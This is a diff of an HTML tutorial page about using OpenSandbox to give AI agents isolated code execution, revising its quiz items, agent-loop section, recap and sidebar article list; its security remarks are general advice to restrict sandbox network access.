+          <input type="radio" name="decision_7" id="decision_7_opt0">
+          <label for="decision_7_opt0">One sandbox per conversation — create it at the start, reuse it for every execution attempt, kill it when the user is done</label>
+          <div class="decision-feedback correct">&#10003; Correct! This is the right call. The Code Interpreter preserves state between runs, so your agent can iteratively fix code: run it, see the traceback, modify it, run again. Creating a new sandbox for each attempt would throw away installed packages, imported modules, and any setup work. One sandbox per conversation keeps things fast and stateful.</div>
+        </div>
+        <div class="decision-option">
+          <input type="radio" name="decision_7" id="decision_7_opt1">
+          <label for="decision_7_opt1">One sandbox per code execution — create a fresh sandbox every time the agent tries to run code, kill it after each attempt</label>
+          <div class="decision-feedback incorrect">&#10007; Not quite. This would work but it&#x27;s wasteful. Each sandbox creation takes a few seconds, and you&#x27;d lose state between runs. If the agent installs a package in attempt #1, it would need to reinstall it in attempt #2. For iterative debugging, you want the state persistence that comes from reusing a sandbox.</div>
+        </div>
+        <div class="decision-option">
+          <input type="radio" name="decision_7" id="decision_7_opt2">
+          <label for="decision_7_opt2">One long-lived sandbox shared across all users — create it once at server startup and let everyone use it</label>
+          <div class="decision-feedback incorrect">&#10007; Not quite. Terrible idea! Sandboxes are isolated environments — that&#x27;s their whole point. If multiple users share a sandbox, one user&#x27;s code could read another&#x27;s files, crash the interpreter for everyone, or install packages that break someone else&#x27;s workflow. Always one sandbox per user session, minimum.</div>
+        </div>
+    </div>
     <div class="checkpoint">
       <div class="checkpoint-icon">&#10003;</div>
-      <div>You now understand the full stack: server setup, sandbox lifecycle, code execution (commands vs. interpreter), wiring it into an agent loop, and network security policies. You&#x27;ve got the mental model for building a production-grade code execution backend for AI agents.</div>
+      <div>Nice! You should now understand the full OpenSandbox workflow: server manages containers, SDK creates sandboxes, Code Interpreter runs code inside them, and the file API moves data in and out. You&#x27;ve got the mental model for how all the pieces fit together. Now let&#x27;s put you in the driver&#x27;s seat.</div>
     </div>
     <div class="your-turn">
       <h3>Your Turn</h3>
-      <div class="your-turn-goal">Build a sandbox-powered agent that can safely execute user-uploaded Python scripts, capture any charts or visualizations they produce, and return both the text output and images</div>
-      <div class="your-turn-context">One of the most common use cases for sandboxed execution is data analysis — a user uploads a CSV and a Python script, and the agent runs it safely and returns results including any matplotlib or seaborn charts. The code interpreter in OpenSandbox can capture rich output, not just text. This is essentially building your own mini version of ChatGPT&#x27;s Code Interpreter.</div>
+      <div class="your-turn-goal">Get your agent to build a reusable helper function that takes arbitrary Python code as a string, runs it in a sandbox, and returns a clean result object with stdout, stderr, and the return value — something you could drop into any agent system as the &#x27;execute code&#x27; capability.</div>
+      <div class="your-turn-context">In a real agent system, you wouldn&#x27;t inline all the sandbox setup every time you want to run code. You&#x27;d wrap it in a clean function that your agent can call as a tool. This is the bridge between your LLM&#x27;s &#x27;I want to run this code&#x27; decision and actually executing it safely.</div>
       
       <div class="agent-hints">
         <div class="agent-hints-label">Think about it</div>
-        <ul><li>How will you get the user&#x27;s CSV file into the sandbox? (Think about the file writing API you learned in Step 2)</li><li>The code interpreter can capture images from matplotlib — what format do they come back in, and how would you display them?</li><li>What if the user&#x27;s script takes 5 minutes to run? How do you handle timeouts gracefully?</li><li>Should you pre-install common data science packages, or let the script install its own?</li></ul>
+        <ul><li>Should the function create a new sandbox every time, or accept an existing one? What are the tradeoffs?</li><li>What should the return type look like? Your agent needs to understand what happened — did it succeed? What was the output? Was there an error?</li><li>How should you handle timeouts? What if the user&#x27;s code runs an infinite loop?</li><li>Think about error handling — what if the sandbox creation itself fails?</li></ul>
       </div>
       
       <details class="reveal">
@@ -1071,43 +1059,100 @@ body.track-audio { --accent: #6B5B95; --accent-hover: #574A7D; --accent-light: r
           <div class="code-block">
             <span class="code-caption">One way you could prompt it</span>
             <button class="copy-btn">COPY</button>
-            <pre><code>Build me a Python function called `run_data_analysis` that: (1) takes a CSV file path and a Python analysis script as strings, (2) creates an OpenSandbox with the code interpreter image, (3) uploads the CSV into the sandbox at /data/input.csv using the file write API, (4) installs pandas, matplotlib, and seaborn via sandbox.commands.run, (5) executes the analysis script through the code interpreter, (6) captures both text output and any generated images, (7) returns a dict with &#x27;stdout&#x27;, &#x27;result&#x27;, &#x27;images&#x27; (as base64 strings), and &#x27;error&#x27; fields, (8) handles timeouts with a 5-minute sandbox limit and cleans up the sandbox when done. Make it async and use proper error handling.</code></pre>
+            <pre><code>Build me an async Python function called `execute_code_safely` that takes a code string and an optional existing sandbox. If no sandbox is provided, it should create a fresh one using the opensandbox code-interpreter image. It should run the code using the Code Interpreter SDK, catch any exceptions, and return a dictionary with keys: &#x27;success&#x27; (bool), &#x27;stdout&#x27; (string), &#x27;stderr&#x27; (string), &#x27;return_value&#x27; (string or None), and &#x27;error&#x27; (string or None if the sandbox itself failed). The sandbox should have a 5-minute timeout. If I pass in an existing sandbox, don&#x27;t kill it when done — let the caller manage the lifecycle. If we created one internally, clean it up.</code></pre>
           </div>
         </div>
       </details>
     </div>
-    <div class="decision-point">
-      <h3>Quick Check</h3>
-      <div class="question">You&#x27;re building an RL training loop that needs to evaluate AI-generated code solutions across 1,000 test cases per hour. Which setup makes the most sense?</div>
-      
-        <div class="decision-option">
-          <input type="radio" name="decision_10" id="decision_10_opt0">
-          <label for="decision_10_opt0">Kubernetes runtime with deny-all egress and pre-built images</label>
-          <div class="decision-feedback correct">&#10003; Correct! At 1,000 evaluations per hour, you need fast sandbox creation (K8s with pre-pulled images), maximum isolation (deny-all egress so solutions can&#x27;t cheat by accessing the internet), and auto-scaling to handle burst load. Pre-built images with common packages avoid pip install overhead on every run. This is exactly the scenario OpenSandbox&#x27;s K8s runtime was designed for.</div>
+    <div class="step-section">
+      <div class="step-header">
+        <div class="step-number">5</div>
+        <h2>Connecting Sandboxes to Your Agent Loop</h2>
+      </div>
+      <div class="step-body">
+        <p>Alright, let&#x27;s zoom out. We&#x27;ve been looking at OpenSandbox in isolation, but the whole point is to wire this into an <strong>agent system</strong>. Let&#x27;s talk about how that actually works.</p>
+
+<p>The typical agent-with-code-execution loop looks like this:</p>
+
+<ol>
+<li><strong>User</strong> asks the agent to do something that requires code (analyze data, build a chart, debug a script)</li>
+<li><strong>LLM</strong> decides it needs to execute code and generates a code string</li>
+<li><strong>Your system</strong> takes that code string and runs it in a sandbox</li>
+<li><strong>Results</strong> (stdout, errors, return values) go back to the LLM</li>
+<li><strong>LLM</strong> interprets the results, either responding to the user or trying again</li>
+</ol>
+
+<p>OpenSandbox slots into step 3. It&#x27;s the execution layer. The LLM never talks to the sandbox directly — your orchestration code does.</p>
+
+<p>If you&#x27;re using a framework like LangChain, CrewAI, or building a custom agent, you&#x27;d register the sandbox executor as a <strong>tool</strong> — something the LLM can choose to invoke. The tool description might say: &quot;Execute Python code in an isolated sandbox. Input: code string. Output: stdout, stderr, and return value.&quot;</p>
+
+<p>Let&#x27;s get our agent to show us what this looks like in practice.</p>
+        
+      <div class="agent-interaction">
+        <div class="agent-goal">
+          <div class="agent-goal-label">Ask your agent</div>
+          Get the agent to sketch out how you&#x27;d register an OpenSandbox code executor as a tool for an LLM agent — using whatever framework you prefer (or plain function-calling)
         </div>
-        <div class="decision-option">
-          <input type="radio" name="decision_10" id="decision_10_opt1">
-          <label for="decision_10_opt1">Docker runtime with allow-all egress for flexibility</label>
-          <div class="decision-feedback incorrect">&#10007; Not quite. Docker runtime can&#x27;t efficiently handle this volume — it&#x27;s single-machine and doesn&#x27;t auto-scale. Allow-all egress is dangerous for RL training because solutions could access the internet to look up answers or exfiltrate test cases. You need the isolation guarantees that deny-all provides.</div>
+        
+        <div class="agent-hints">
+          <div class="agent-hints-label">Think about it</div>
+          <ul><li>What does the LLM need to know about this tool? Think about the tool description and parameters.</li><li>Should the sandbox be created per-tool-call or persist across the agent&#x27;s session?</li><li>What information from the sandbox result should go back to the LLM? Everything, or a curated summary?</li><li>What about security — should you limit what code the sandbox can run? Network access?</li></ul>
         </div>
-        <div class="decision-option">
-          <input type="radio" name="decision_10" id="decision_10_opt2">
-          <label for="decision_10_opt2">Skip sandboxes entirely and use subprocess for speed</label>
-          <div class="decision-feedback incorrect">&#10007; Not quite. Running AI-generated code via subprocess on your host machine is a security nightmare at any scale, but especially at 1,000 runs per hour. One malicious or buggy solution could crash your machine, corrupt data, or worse. The sandbox overhead is worth it — OpenSandbox&#x27;s K8s runtime claims sub-second creation times, so the performance cost is minimal.</div>
-        </div>
+        
+      <details class="reveal">
+        <summary>What the agent gives back</summary>
+        <div class="reveal-body"><p>The agent should sketch out a tool definition with a name like <code>execute_python</code>, a description that tells the LLM what the tool does, and a parameter schema (just a <code>code</code> string). The implementation would use the <code>execute_code_safely</code> function from the previous step. The agent should mention that in practice, you&#x27;d create the sandbox once when the agent session starts and reuse it across tool calls for state persistence. It should also mention that OpenSandbox supports <strong>egress controls</strong> — you can restrict whether sandbox code can access the internet, which is important for security in production. The response sent back to the LLM should include stdout, the return value, and any errors — enough for the LLM to understand what happened and iterate.</p></div>
+      </details>
+      </div>
+        
+        
+      <div class="callout callout-tip">
+        <div class="callout-label">Tip</div>
+        When sending sandbox results back to the LLM, truncate long outputs! If the code prints 10,000 lines, sending all of that back to the model wastes tokens and confuses it. Send the first ~50 lines of stdout and the last ~20, with a note about truncation.
+      </div>
+      <div class="callout callout-warning">
+        <div class="callout-label">Warning</div>
+        OpenSandbox has egress controls (per-sandbox network policies) and an ingress gateway. In production, ALWAYS restrict network access for sandboxes running untrusted code. A malicious code snippet could exfiltrate data, mine crypto, or attack other services on your network.
+      </div>
+        
+      <details class="reveal">
+        <summary>What about other sandbox types beyond Code Interpreter?</summary>
+        <div class="reveal-body"><p>OpenSandbox isn&#x27;t just for running Python. The platform supports:</p>
+
+<ul>
+<li><strong>Browser environments</strong> — Sandboxes with Chrome and Playwright pre-installed, perfect for GUI agents that need to navigate websites</li>
+<li><strong>Desktop environments</strong> — Full desktop with VNC access, for agents that need to interact with GUI applications</li>
+<li><strong>Custom environments</strong> — Build your own Docker image with whatever tools you need</li>
+</ul>
+
+<p>The Code Interpreter is the most common use case, but if you&#x27;re building something like a web scraping agent or a QA testing agent, those other environments are gold. Same SDK, same lifecycle, different container image.</p></div>
+      </details>
+      <details class="reveal">
+        <summary>Docker vs Kubernetes — when do you need K8s?</summary>
+        <div class="reveal-body"><p>Docker is perfect for local development and small-scale deployment. But if you need to run many sandboxes concurrently (like serving multiple users), Docker on a single machine hits limits fast.</p>
+
+<p>OpenSandbox&#x27;s Kubernetes runtime lets you schedule sandboxes across a cluster, with proper resource limits, auto-scaling, and isolation. The documentation mentions a &#x27;high-performance Kubernetes runtime&#x27; — this is for scenarios like RL training where you might spin up hundreds of sandboxes simultaneously.</p>
+
+<p>The beautiful part: your SDK code is identical. You just change the server&#x27;s config file from Docker to Kubernetes. The SDK doesn&#x27;t know or care which runtime is underneath.</p></div>
+      </details>
+      </div>
     </div>
     <div class="recap-section">
       <h2>Recap</h2>
-      <div class="recap-body"><p>We just walked through the full stack of giving AI agents a safe, isolated environment to execute code — from installing the OpenSandbox server to wiring it into an agent loop with proper security controls.</p>
+      <div class="recap-body"><p>Let&#x27;s step back and look at what we covered today.</p>
 
-<p>Here&#x27;s what&#x27;s exciting about this: until recently, sandboxed code execution for AI was either a hosted service (you send your code to someone else&#x27;s servers) or a DIY Docker mess (you spend a week building what should be a library). OpenSandbox sits in the sweet spot — open source, self-hosted, and designed specifically for the weird requirements of AI applications (fast creation, rich output capture, network isolation, multi-language support).</p>
+<p>We started with a real problem: AI agents can write code, but they need somewhere safe to run it. OpenSandbox gives us that — a server that manages isolated Docker containers, an SDK that makes working with them feel almost trivial, and a Code Interpreter layer that turns those containers into full REPL environments.</p>
 
-<p>The pattern we built — LLM generates code → sandbox executes it → results feed back to LLM — is the foundation for coding agents, data analysis copilots, eval harnesses, and RL training environments. It&#x27;s the same pattern powering ChatGPT&#x27;s Code Interpreter, Devin&#x27;s code execution, and dozens of agent frameworks. Now you can run it on your own infrastructure.</p></div>
-      <ul class="takeaways-list"><li>OpenSandbox separates the sandbox server (lifecycle management) from the SDK (your code), so you can swap Docker for Kubernetes without changing your application</li><li>The code interpreter captures structured results (return values, images) — not just stdout — which makes it far more useful for AI agents than raw shell execution</li><li>Egress network controls are critical for production: default deny-all, then allowlist only what the sandbox actually needs (like pypi.org for package installs)</li><li>The retry pattern (execute → error → feed error back to LLM → retry) dramatically improves agent reliability, and sandboxing makes it safe to retry even broken code</li><li>For high-volume scenarios like RL training or batch evals, the Kubernetes runtime with pre-built images gives you sub-second sandbox creation at scale</li></ul>
+<p>The architecture is clean: <strong>server</strong> (manages containers) → <strong>sandbox</strong> (isolated environment) → <strong>Code Interpreter</strong> (structured code execution). Files go in and out through an explicit API. Sandboxes are ephemeral — create them, use them, throw them away.</p>
+
+<p>The real power isn&#x27;t any single feature — it&#x27;s that this gives you a <strong>standard, reusable execution layer</strong> for any agent system. Whether you&#x27;re building a coding assistant, a data analysis agent, or an evaluation harness, the pattern is the same: create sandbox, run code, get results, iterate.</p>
+
+<p>And because it runs on Docker locally and Kubernetes in production (with the same SDK), you can prototype on your laptop and deploy without rewriting anything. That&#x27;s a genuinely nice developer experience.</p></div>
+      <ul class="takeaways-list"><li>Sandboxes are ephemeral containers — create, use, destroy. They&#x27;re cheap and isolated, perfect for untrusted code execution.</li><li>The Code Interpreter layer gives you structured results (return values + stdout + stderr), not just raw terminal output. This is what makes it agent-friendly.</li><li>The SDK is async-first and uses context managers for lifecycle management — <code>async with sandbox:</code> ensures cleanup even if things crash.</li><li>File operations are explicit (write in, read out) — the sandbox filesystem is completely isolated from your host, which is a security feature, not a limitation.</li><li>Same SDK code works on Docker (local dev) and Kubernetes (production). The runtime is a server config, not a code change.</li></ul>
       
       <div class="next-steps">
         <h3>Where to go next</h3>
-        <ul><li>Explore the examples/ directory in the OpenSandbox repo — there are demos for browser automation (Chrome, Playwright) and desktop environments (VNC) that go way beyond code execution</li><li>Try building a multi-turn coding agent that keeps the sandbox alive across a conversation, so the user can iteratively refine their analysis</li><li>Set up egress policies and test them by having an agent try to make network requests — verify that unauthorized requests get blocked</li><li>If you&#x27;re working at scale, spin up the Kubernetes runtime and benchmark sandbox creation times for your workload</li></ul>
+        <ul><li>Try the browser automation sandbox — spin up a sandbox with Chrome/Playwright and have your agent navigate websites</li><li>Build a proper agent tool with output truncation, timeout handling, and error formatting for your framework of choice</li><li>Explore the Kubernetes runtime docs if you need to scale beyond a single machine — the OpenSandbox docs cover cluster setup</li><li>Look into the egress controls and ingress gateway for production security — restricting sandbox network access is critical for untrusted code</li></ul>
       </div>
     </div>
     <div class="sources-section">
@@ -1173,7 +1218,7 @@ body.track-audio { --accent: #6B5B95; --accent-hover: #574A7D; --accent-light: r
         <div class="other-article-card">
           <div class="oa-info">
             <div class="oa-title">Comfy-Org/ComfyUI</div>
-            <div class="oa-summary">Modular node-based GUI for building and running image generation pipelines with diffusion models.</div>
+            <div class="oa-summary">Modular node-based GUI for building and running diffusion model image generation workflows.</div>
             <div class="oa-meta">GitHub Trending Python</div>
           </div>
           <div class="oa-votes">
@@ -1211,9 +1256,9 @@ body.track-audio { --accent: #6B5B95; --accent-hover: #574A7D; --accent-light: r
         </div>
         <div class="other-article-card">
           <div class="oa-info">
-            <div class="oa-title">AI Made Writing Code Easier. It Made Being an Engineer Harder</div>
-            <div class="oa-summary">Argues AI coding tools lower the bar for writing code but raise the bar for engineering judgment.</div>
-            <div class="oa-meta">Hacker News AI · Mar 1</div>
+            <div class="oa-title">If AI writes code, should the session be part of the commit?</div>
+            <div class="oa-summary">Tool and discussion about storing AI coding sessions as metadata alongside git commits.</div>
+            <div class="oa-meta">Hacker News AI · Mar 2</div>
           </div>
           <div class="oa-votes">
             <input type="radio" name="vote_7" value="up" id="vote_7_up" class="oa-toggle" data-idx="7">
@@ -1224,9 +1269,9 @@ body.track-audio { --accent: #6B5B95; --accent-hover: #574A7D; --accent-light: r
         </div>
         <div class="other-article-card">
           <div class="oa-info">
-            <div class="oa-title">OpenFang</div>
-            <div class="oa-summary">Open-source operating system designed to run and manage AI agents locally.</div>
-            <div class="oa-meta">Product Hunt AI · Mar 1</div>
+            <div class="oa-title">AI Made Writing Code Easier. It Made Being an Engineer Harder</div>
+            <div class="oa-summary">Argues AI coding tools lower the code-writing bar but raise the bar for engineering judgment.</div>
+            <div class="oa-meta">Hacker News AI · Mar 1</div>
           </div>
           <div class="oa-votes">
             <input type="radio" name="vote_8" value="up" id="vote_8_up" class="oa-toggle" data-idx="8">
@@ -1237,9 +1282,9 @@ body.track-audio { --accent: #6B5B95; --accent-hover: #574A7D; --accent-light: r
         </div>
         <div class="other-article-card">
           <div class="oa-info">
-            <div class="oa-title">Running a One Trillion-Parameter LLM Locally on AMD Ryzen AI Max+ Cluster</div>
-            <div class="oa-summary">AMD demonstrates running a trillion-parameter language model locally using a cluster of Ryzen AI Max+ systems.</div>
-            <div class="oa-meta">Hacker News AI · Mar 1</div>
+            <div class="oa-title">OpenFang</div>
+            <div class="oa-summary">Open-source operating system designed for building and running autonomous AI agents.</div>
+            <div class="oa-meta">Product Hunt AI · Mar 1</div>
           </div>
           <div class="oa-votes">
             <input type="radio" name="vote_9" value="up" id="vote_9_up" class="oa-toggle" data-idx="9">
@@ -1255,7 +1300,7 @@ body.track-audio { --accent: #6B5B95; --accent-hover: #574A7D; --accent-light: r
     </div>
     <script>
     (function() {
-      var articles = [{"title": "666ghj/BettaFish", "tags": "agents", "source": "GitHub Trending Python"}, {"title": "anthropics/skills", "tags": "agents", "source": "GitHub Trending Python"}, {"title": "datawhalechina/hello-agents", "tags": "agents", "source": "GitHub Trending Python"}, {"title": "microsoft/markitdown", "tags": "tools", "source": "GitHub Trending Python"}, {"title": "Comfy-Org/ComfyUI", "tags": "tools,vision", "source": "GitHub Trending Python"}, {"title": "EbookFoundation/free-programming-books", "tags": "coding", "source": "GitHub Trending Python"}, {"title": "I built a demo of what AI chat will look like when it's “free” and ad-supported", "tags": "tools", "source": "Hacker News AI"}, {"title": "AI Made Writing Code Easier. It Made Being an Engineer Harder", "tags": "coding", "source": "Hacker News AI"}, {"title": "OpenFang", "tags": "agents,open-source", "source": "Product Hunt AI"}, {"title": "Running a One Trillion-Parameter LLM Locally on AMD Ryzen AI Max+ Cluster", "tags": "coding", "source": "Hacker News AI"}];
+      var articles = [{"title": "666ghj/BettaFish", "tags": "agents", "source": "GitHub Trending Python"}, {"title": "anthropics/skills", "tags": "agents", "source": "GitHub Trending Python"}, {"title": "datawhalechina/hello-agents", "tags": "agents", "source": "GitHub Trending Python"}, {"title": "microsoft/markitdown", "tags": "tools", "source": "GitHub Trending Python"}, {"title": "Comfy-Org/ComfyUI", "tags": "tools,vision", "source": "GitHub Trending Python"}, {"title": "EbookFoundation/free-programming-books", "tags": "coding", "source": "GitHub Trending Python"}, {"title": "I built a demo of what AI chat will look like when it's “free” and ad-supported", "tags": "tools", "source": "Hacker News AI"}, {"title": "If AI writes code, should the session be part of the commit?", "tags": "coding", "source": "Hacker News AI"}, {"title": "AI Made Writing Code Easier. It Made Being an Engineer Harder", "tags": "coding", "source": "Hacker News AI"}, {"title": "OpenFang", "tags": "agents,open-source", "source": "Product Hunt AI"}];
       var repo = "coldbrewnosugar/ai-course";
       var track = "general";
       var date = "2026-03-02";
